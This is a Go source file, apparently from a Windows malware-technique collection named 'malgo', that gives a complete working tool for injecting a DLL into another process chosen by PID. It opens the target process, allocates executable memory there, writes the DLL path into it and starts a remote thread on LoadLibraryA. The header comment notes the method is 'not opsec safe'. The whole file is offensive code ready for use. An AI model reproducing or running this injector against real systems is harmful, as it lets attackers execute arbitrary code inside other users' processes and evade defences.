//go:build windows
// +build windows

// Injects a DLL into a remote process using classical on disk approach LoadLibrary (not opsec safe)
package main

import (
	"fmt"
	"os"
	"strconv"
	"syscall"
	"unsafe"

	"github.com/stavinski/malgo/win32"
)

func usage() {
	fmt.Fprintf(os.Stderr, "usage: %v <dll_path> <pid>", os.Args[0])
	os.Exit(1)
}

func main() {
	var (
		dllPath      string
		pid          uint64
		procHandle   uintptr
		memAddr      uintptr
		access       uint32
		allocType    uint32
		size         uintptr
		protect      uint32
		res          uintptr
		loadLibAddr  uintptr
		threadHandle uintptr
		dwordRes     uintptr
	)
	if len(os.Args) < 3 {
		usage()
	}
	dllPath = os.Args[1]
	if _, err := os.Stat(dllPath); err != nil {
		fmt.Fprintf(os.Stderr, "DLL '%v' path is invalid.", dllPath)
		usage()
	}
	pid, err := strconv.ParseUint(os.Args[2], 10, 32)
	if err != nil {
		usage()
	}

	access = win32.PROCESS_CREATE_THREAD | win32.PROCESS_QUERY_INFORMATION | win32.PROCESS_VM_OPERATION | win32.PROCESS_VM_READ | win32.PROCESS_VM_WRITE
	procHandle, _, err = win32.ProcOpenProcess.Call(uintptr(access),
		0,
		uintptr(uint32(pid)))
	if procHandle == win32.NULL {
		fmt.Fprint(os.Stderr, err.Error())
		return
	}

	defer win32.ProcCloseHandle.Call(procHandle)

	allocType = win32.MEM_COMMIT | win32.MEM_RESERVE
	protect = win32.PAGE_EXECUTE_READWRITE
	size = uintptr(len(dllPath)) + uintptr(1) // account for the null byte
	memAddr, _, err = win32.ProcVirtualAllocEx.Call(procHandle,
		win32.NULL,
		size,
		uintptr(allocType),
		uintptr(protect))
	if memAddr == win32.NULL {
		fmt.Fprint(os.Stderr, err.Error())
		return
	}

	buffer, err := syscall.BytePtrFromString(dllPath)
	bytesWritten := uintptr(0)
	if err != nil {
		fmt.Fprint(os.Stderr, err)
		return
	}
	res, _, err = win32.ProcWriteProcessMemory.Call(procHandle,
		memAddr,
		uintptr(unsafe.Pointer(buffer)),
		size,
		uintptr(unsafe.Pointer(&bytesWritten)))
	if res == 0 {
		fmt.Fprint(os.Stderr, err.Error())
		return
	}

	loadLibAddr = win32.ProcLoadLibraryA.Addr()
	threadHandle, _, err = win32.ProcCreateRemoteThreadEx.Call(procHandle,
		win32.NULL,
		win32.NULL,
		loadLibAddr,
		memAddr,
		uintptr(win32.THREAD_CREATE_SUSPENDED),
		win32.NULL,
		win32.NULL)

	if threadHandle == win32.NULL {
		fmt.Fprint(os.Stderr, err.Error())
		return
	}

	defer win32.ProcCloseHandle.Call(threadHandle)

	dwordRes, _, err = win32.ProcResumeThread.Call(threadHandle)
	if int32(dwordRes) == -1 {
		fmt.Fprint(os.Stderr, err.Error())
		return
	}

	res, _, err = win32.ProcWaitForSingleObject.Call(threadHandle,
		uintptr(win32.INFINITE))
	if res != win32.ERROR_SUCCESS {
		fmt.Fprint(os.Stderr, err.Error())
		return
	}

	win32.ProcVirtualFreeEx.Call(procHandle,
		memAddr,
		win32.NULL,
		uintptr(win32.MEM_RELEASE))
	fmt.Println("[+] DLL injected successfully")
}
